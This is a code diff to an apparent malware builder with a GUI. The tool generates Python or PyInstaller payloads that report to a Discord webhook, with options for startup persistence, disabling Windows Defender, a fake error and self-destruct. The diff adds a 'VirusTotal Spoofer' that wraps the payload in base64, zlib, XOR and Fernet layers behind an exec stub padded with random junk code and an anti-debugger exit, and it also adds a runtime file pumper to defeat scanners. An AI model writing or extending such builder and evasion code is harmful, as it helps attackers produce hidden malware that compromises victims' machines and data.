@@ -14,6 +14,11 @@ import customtkinter
 import math
 import ctypes
 from ctypes import wintypes
+import base64
+import random
+import zlib
+from string import ascii_letters, digits
+from cryptography.fernet import Fernet
 
 customtkinter.set_appearance_mode("dark")
 
@@ -135,14 +140,165 @@ def log_error(message):
     except:
         pass
 
-def generate_script(webhook_url, output_name, fake_error, add_startup, webhook_name, webhook_pfp, disable_defender, self_destruct, file_pumper, pump_size, anti_spam, ping, ping_type):
+def gen_random_string(length=10):
+    first_char = random.choice(ascii_letters)
+    rest = ''.join(random.choices(ascii_letters + digits, k=length-1))
+    return first_char + rest
+
+def xor_encrypt(data: bytes, key: bytes) -> bytes:
+    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
+
+def gen_junk_function():
+    func_name = gen_random_string(8)
+    var1, var2 = gen_random_string(5), gen_random_string(5)
+    r1, r2 = random.randint(0, 999), random.randint(0, 999)
+    return f'def {func_name}({var1}={r1}):\n    {var2} = {r2}\n    for _ in range({random.randint(2, 10)}):\n        {var2} += {var1}\n    return {var2}\n'
+
+def gen_junk_class():
+    class_name = gen_random_string(10)
+    method_name = gen_random_string(8)
+    var1 = gen_random_string(6)
+    return f'class {class_name}:\n    def {method_name}(self):\n        {var1} = {random.randint(100, 999)}\n        return {var1} * 2\n'
+
+def genjunk(num):
+    code = ''
+    for _ in range(num):
+        choice = random.choice([1, 2, 3])
+        if choice == 1:
+            code += gen_junk_function()
+        elif choice == 2:
+            code += gen_junk_class()
+        else:
+            var_name = gen_random_string(10)
+            r1, r2 = random.randint(0, 999), random.randint(0, 999)
+            code += f'{var_name} = {r1} * {r2}\n'
+    return code
+
+def encode_b64(data: str) -> str:
+    try:
+        return base64.b64encode(data.encode()).decode()
+    except Exception as e:
+        log_error(f"Base64 encode error: {str(e)}")
+        return ""
+
+def compress(data: str) -> bytes:
+    try:
+        return zlib.compress(data.encode())
+    except Exception as e:
+        log_error(f"Zlib compress error: {str(e)}")
+        return b""
+
+def fernet_encrypt(key: bytes, data: bytes) -> bytes:
+    try:
+        cipher_suite = Fernet(key)
+        return cipher_suite.encrypt(data)
+    except Exception as e:
+        log_error(f"Fernet encrypt error: {str(e)}")
+        return b""
+
+def anti_debug_check():
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            os._exit(1)
+    except:
+        pass
+
+def obfuscate_code(script_content: str, output_name: str):
+    anti_debug_check()
+    encoded_data = encode_b64(script_content)
+    if not encoded_data:
+        log_error("Obfuscation failed: Base64 encoding returned empty")
+        return None
+    compressed_data = compress(encoded_data)
+    if not compressed_data:
+        log_error("Obfuscation failed: Compression returned empty")
+        return None
+    xor_key = os.urandom(16)
+    xor_key_repr = repr(xor_key)
+    xor_encrypted = xor_encrypt(compressed_data, xor_key)
+    fernet_key = Fernet.generate_key()
+    encrypted_data = fernet_encrypt(fernet_key, xor_encrypted)
+    if not encrypted_data:
+        log_error("Obfuscation failed: Fernet encryption returned empty")
+        return None
+
+    encrypted_data_repr = repr(encrypted_data)  # ← Musi być po udanym szyfrowaniu
+
+    junk_code = genjunk(random.randint(20, 50))
+
+    fernet_key_var = gen_random_string(12)
+    xor_key_var = gen_random_string(12)
+    cipher_var = gen_random_string(12)
+    xor_decrypted_var = gen_random_string(12)  # ← dodaj to
+    decrypted_var = gen_random_string(12)
+    decompressed_var = gen_random_string(12)
+    decoded_var = gen_random_string(12)
+
+    stub_code = f'''import sys
+import os
+import ctypes
+import base64
+import zlib
+from cryptography.fernet import Fernet
+
+def _anti_debug():
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            os._exit(1)
+    except:
+        pass
+
+_anti_debug()
+
+def _xor_decrypt(data: bytes, key: bytes) -> bytes:
+    try:
+        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
+    except Exception as e:
+        with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
+            f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> XOR decrypt error: {{str(e)}}\\n")
+        sys.exit(1)
+
+{junk_code}
+
+try:
+    {fernet_key_var} = "{fernet_key.decode()}"
+    {xor_key_var} = {xor_key_repr}
+    encrypted_data = {encrypted_data_repr}
+
+    {cipher_var} = Fernet({fernet_key_var}.encode())
+    {xor_decrypted_var} = {cipher_var}.decrypt(encrypted_data)
+    {decrypted_var} = _xor_decrypt({xor_decrypted_var}, {xor_key_var})
+    {decompressed_var} = zlib.decompress({decrypted_var})
+    {decoded_var} = base64.b64decode({decompressed_var}).decode()
+    exec({decoded_var})
+except Exception as e:
+    with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
+        f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> Obfuscation execution error: {{str(e)}}\\n")
+    sys.exit(1)
+'''
+
+    output_path = os.path.normpath(os.path.join(os.getcwd(), f"{output_name}.py"))
+    try:
+        with open(output_path, "w", encoding="utf-8") as f:
+            f.write(stub_code)
+        if not os.path.exists(output_path):
+            log_error(f"Obfuscated file not created at {output_path}")
+            return None
+    except Exception as e:
+        log_error(f"Failed to write obfuscated .py file: {str(e)}")
+        return None
+    return output_path
+
+def generate_script(webhook_url, output_name, fake_error, add_startup, webhook_name, webhook_pfp, disable_defender, self_destruct, file_pumper, pump_size, anti_spam, ping, ping_type, spoof_virustotal=False):
     if not os.access(os.getcwd(), os.W_OK):
         log_error("No write permission in current directory")
-        return
+        messagebox.showerror("Error", "No write permission in current directory. Try running as administrator.")
+        return False
 
     if webhook_pfp and not validate_image_url(webhook_pfp):
         log_error("Invalid webhook profile picture URL (must be a valid image URL)")
-        return
+        messagebox.showerror("Error", "Invalid webhook profile picture URL. Please use a valid image URL or leave it empty.")
+        return False
 
     self_destruct_code = '''def self_destruct():
     try:
@@ -169,8 +325,18 @@ def generate_script(webhook_url, output_name, fake_error, add_startup, webhook_n
         log(f"Self-destruct error: {str(e)}")\n''' if self_destruct else ''
 
     pumper_code = '''def file_pumper():
-    log("File pumper: Skipped, size added during generation")
-    pass\n''' if file_pumper else ''
+    try:
+        file_path = os.path.abspath(__file__ if hasattr(sys, 'frozen') else sys.argv[0])
+        target_size = %s
+        current_size = os.path.getsize(file_path)
+        if current_size < target_size:
+            with open(file_path, 'ab') as f:
+                f.write(b'X' * (target_size - current_size))
+            log(f"File pumped to {target_size} bytes")
+        else:
+            log("File pumper: Skipped, file already meets or exceeds target size")
+    except Exception as e:
+        log(f"File pumper error: {str(e)}")\n''' % (int(pump_size.replace("mb", "")) * 1024 * 1024) if file_pumper else ''
 
     startup_ext = ".py" if self_destruct and file_type == ".py" else ".exe"
     startup_check = "True" if self_destruct else "sys.argv[0].lower().endswith('.exe')"
@@ -193,9 +359,12 @@ WEBHOOK_URL = "{webhook_url}"
 ANTI_SPAM_FILE = os.path.join(os.getenv("TEMP"), "chrome_BITS_9032_815744591.txt")
 
 def log(text, sleep=None):
-    with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
-        f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> {{text}}\\n")
-    if sleep: zzz(sleep)
+    try:
+        with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
+            f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> {{text}}\\n")
+        if sleep: zzz(sleep)
+    except Exception as e:
+        pass
 
 def check_anti_spam():
     if {anti_spam}:
@@ -402,49 +571,60 @@ if __name__ == "__main__":
     script_lines = script_content.split('\n')
     script_content = '\n'.join(line for line in script_lines if not line.strip().startswith('#'))
 
-    # Debug: Write script_content to a temp file for inspection
-    try:
-        debug_path = os.path.join(os.getenv("TEMP"), f"generated_script_{uuid.uuid4().hex}.py")
-        with open(debug_path, "w", encoding="utf-8") as f:
-            f.write(script_content)
-    except Exception as e:
-        log_error(f"Failed to write debug script: {str(e)}")
-
     output_path = os.path.normpath(os.path.join(os.getcwd(), f"{output_name}.py"))
     exe_path = os.path.normpath(os.path.join(os.getcwd(), f"{output_name}.exe"))
+
+    if spoof_virustotal:
+        try:
+            obfuscated_path = obfuscate_code(script_content, output_name)
+            if not obfuscated_path:
+                log_error("Obfuscation failed, aborting build")
+                messagebox.showerror("Error", "Obfuscation failed. Check builder_errors.log in TEMP directory.")
+                return False
+            output_path = obfuscated_path
+        except Exception as e:
+            log_error(f"Obfuscation error: {str(e)}")
+            messagebox.showerror("Error", f"Obfuscation error: {str(e)}. Check builder_errors.log in TEMP directory.")
+            cleanup_files(output_name, include_temp=False)
+            return False
+    else:
+        try:
+            cleanup_files(output_name, include_temp=False)
+            if not os.access(os.getcwd(), os.W_OK):
+                raise PermissionError("No write permission for output directory")
+            with open(output_path, "w", encoding="utf-8") as f:
+                f.write(script_content)
+            if not os.path.exists(output_path):
+                raise FileNotFoundError(f"Failed to create {output_path}")
+        except Exception as e:
+            log_error(f"Failed to write .py file: {str(e)}")
+            messagebox.showerror("Error", f"Failed to write .py file: {str(e)}. Check builder_errors.log in TEMP directory.")
+            cleanup_files(output_name, include_temp=False)
+            return False
 
     if file_pumper:
         try:
             pump_size_bytes = int(pump_size.replace("mb", "")) * 1024 * 1024
             if pump_size_bytes < 1024 * 1024 or pump_size_bytes > 100 * 1024 * 1024:
                 raise ValueError("Pump size must be between 1mb and 100mb")
-            script_size = len(script_content.encode('utf-8'))
-            if script_size < pump_size_bytes:
-                padding_char = "X"
-                padding_line = f"_padding = '{padding_char * 94}'"
-                padding_size = len(padding_line.encode('utf-8'))
-                num_lines = math.ceil((pump_size_bytes - script_size) / padding_size)
-                script_content += "\n" + "\n".join([padding_line] * num_lines)
-                final_size = len(script_content.encode('utf-8'))
-                if abs(final_size - pump_size_bytes) > 1024:
-                    log_error(f"File size mismatch: expected {pump_size_bytes}, got {final_size}")
+            if file_type == "pyinstaller":
+                # Defer pumping to runtime for .exe
+                pass
+            else:
+                # Pump .py file directly
+                current_size = os.path.getsize(output_path)
+                if current_size < pump_size_bytes:
+                    with open(output_path, 'ab') as f:
+                        f.write(b'X' * (pump_size_bytes - current_size))
+                    final_size = os.path.getsize(output_path)
+                    log_error(f"File pumped to {final_size} bytes")
+                else:
+                    log_error("File pumper: Skipped, file already meets or exceeds target size")
         except Exception as e:
             log_error(f"File pumper error: {str(e)}")
+            messagebox.showerror("Error", f"File pumper error: {str(e)}. Check builder_errors.log in TEMP directory.")
             cleanup_files(output_name, include_temp=False)
-            return
-
-    try:
-        cleanup_files(output_name, include_temp=False)
-        if not os.access(os.getcwd(), os.W_OK):
-            raise PermissionError("No write permission for output directory")
-        with open(output_path, "w", encoding="utf-8") as f:
-            f.write(script_content)
-        if not os.path.exists(output_path):
-            raise FileNotFoundError(f"Failed to create {output_path}")
-    except Exception as e:
-        log_error(f"Failed to write .py file: {str(e)}")
-        cleanup_files(output_name, include_temp=False)
-        return
+            return False
 
     if file_type == "pyinstaller":
         import site
@@ -458,23 +638,26 @@ if __name__ == "__main__":
                 log_error(f"Could not find {dll} in {pywin32_dir}. DLL will not be bundled.")
         pyinstaller_cmd = [
             "pyinstaller",
-            "--onefile", "--clean", "--noconsole", "--noupx",
-            "--workpath=pyinstaller_temp",
-            "--hidden-import=base64",
-            "--hidden-import=json",
+            "--onefile", "--noconsole",
+            "--hidden-import=psutil",
             "--hidden-import=requests",
             "--hidden-import=pywin32",
             "--hidden-import=win32gui",
             "--hidden-import=win32con",
-            "--hidden-import=win32api",
-            "--hidden-import=win32file",
+            "--hidden-import=wmi",
+            "--hidden-import=pythoncom",
+            "--hidden-import=cryptography",
+            "--hidden-import=cryptography.fernet",
+            "--hidden-import=zlib",
+            "--hidden-import=ctypes.wintypes",
+            "--hidden-import=base64",
+            "--hidden-import=json",
             "--hidden-import=sys",
             "--hidden-import=time",
             "--hidden-import=os",
             "--hidden-import=shutil",
             "--hidden-import=subprocess",
             "--hidden-import=ctypes",
-            "--hidden-import=ctypes.wintypes",
             "--hidden-import=datetime",
             "--hidden-import=uuid",
         ] + pywin32_dlls + [
@@ -511,15 +694,18 @@ cd /d "{script_dir}" || (
                 f.write(bat_content)
             cmd_command = f"start cmd /k call \"{bat_path}\""
             subprocess.Popen(cmd_command, shell=True, cwd=script_dir)
+            return True
         except Exception as e:
             log_error(f"Failed to start PyInstaller CMD: {str(e)}")
+            messagebox.showerror("Error", f"Failed to start PyInstaller: {str(e)}. Check builder_errors.log in TEMP directory.")
             cleanup_files(output_name, include_temp=False)
             try:
                 if os.path.exists(bat_path):
                     os.remove(bat_path)
             except:
                 pass
-            return
+            return False
+    return True
 
 def create_builder_gui():
     webhook_valid = False
@@ -534,7 +720,7 @@ def create_builder_gui():
         "file_pumper": False,
         "pump_size": "10mb",
         "anti_spam": False,
-        "locked": False
+        "spoof_virustotal": False
     }
     after_ids = []
     global icon_path, file_type
@@ -685,14 +871,13 @@ def create_builder_gui():
     )
     pump_size_menu.grid(row=8, column=0, sticky="w", padx=128, pady=4)
 
-    locked_var = tk.BooleanVar()
-    locked_check = customtkinter.CTkCheckBox(
-        root, text="Soon", font=customtkinter.CTkFont(size=13, family="Arial"),
-        fg_color="#8B0000", hover_color="#4B0000", variable=locked_var,
-        command=lambda: update_config("locked", locked_var.get()),
-        state="disabled"
+    spoof_virustotal_var = tk.BooleanVar()
+    spoof_virustotal_check = customtkinter.CTkCheckBox(
+        root, text="VirusTotal Spoofer", font=customtkinter.CTkFont(size=13, family="Arial"),
+        fg_color="#8B0000", hover_color="#4B0000", variable=spoof_virustotal_var,
+        command=lambda: update_config("spoof_virustotal", spoof_virustotal_var.get())
     )
-    locked_check.grid(row=8, column=1, sticky="w", padx=8, pady=4)
+    spoof_virustotal_check.grid(row=8, column=1, sticky="w", padx=8, pady=4)
 
     ping_var = tk.BooleanVar()
     ping_check = customtkinter.CTkCheckBox(
@@ -720,6 +905,15 @@ def create_builder_gui():
     )
     anti_spam_check.grid(row=9, column=1, sticky="w", padx=8, pady=4)
 
+    build_button = customtkinter.CTkButton(
+        root, width=180, height=28, text="Build", corner_radius=5,
+        font=customtkinter.CTkFont(size=13, family="Arial"),
+        fg_color="#8B0000", hover_color="#4B0000", cursor="hand2",
+        command=lambda: build_action(),
+        state="disabled"
+    )
+    build_button.grid(row=10, column=0, columnspan=2, pady=8)
+
     def build_action():
         output_name = output_entry.get().strip()
         reserved_names = {"CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"}
@@ -745,25 +939,23 @@ def create_builder_gui():
         root.update()
         global file_type
         file_type = file_type_var.get()
-        generate_script(
+        success = generate_script(
             webhook_entry.get(), output_name,
             fake_error_var.get(), add_startup_var.get(),
             webhook_name_entry.get(), webhook_pfp_entry.get(),
             disable_defender_var.get(), self_destruct_var.get(),
             file_pumper_var.get(), pump_size_var.get(), anti_spam_var.get(),
-            ping_var.get(), ping_type_var.get()
+            ping_var.get(), ping_type_var.get(), spoof_virustotal_var.get()
         )
+        build_button.configure(text="Build", fg_color="#8B0000")
+        if success:
+            if file_type == "pyinstaller":
+                messagebox.showinfo("Success", f"Build started! Check for {output_name}.exe in the current directory. A command window will close automatically when done.")
+            else:
+                messagebox.showinfo("Success", f"Build completed! Check for {output_name}.py in the current directory.")
+        root.update()
         after_id = root.after(800, lambda: build_button.configure(text="Build", fg_color="#8B0000"))
         after_ids.append(after_id)
-
-    build_button = customtkinter.CTkButton(
-        root, width=180, height=28, text="Build", corner_radius=5,
-        font=customtkinter.CTkFont(size=13, family="Arial"),
-        fg_color="#8B0000", hover_color="#4B0000", cursor="hand2",
-        command=build_action,
-        state="disabled"
-    )
-    build_button.grid(row=10, column=0, columnspan=2, pady=8)
 
     def update_config(key, value):
         updated_dictionary[key] = value
@@ -778,7 +970,7 @@ def create_builder_gui():
             after_ids.append(after_id)
 
     def update_pumper_state():
-        pump_size_menu.configure(state="normal" if file_pumper_var.get() else "disabled")
+        pump_size_menu.configure(state="normal" if file_pumper_var.get() and not spoof_virustotal_var.get() else "disabled")
         update_config("file_pumper", file_pumper_var.get())
 
     def update_ping_state():
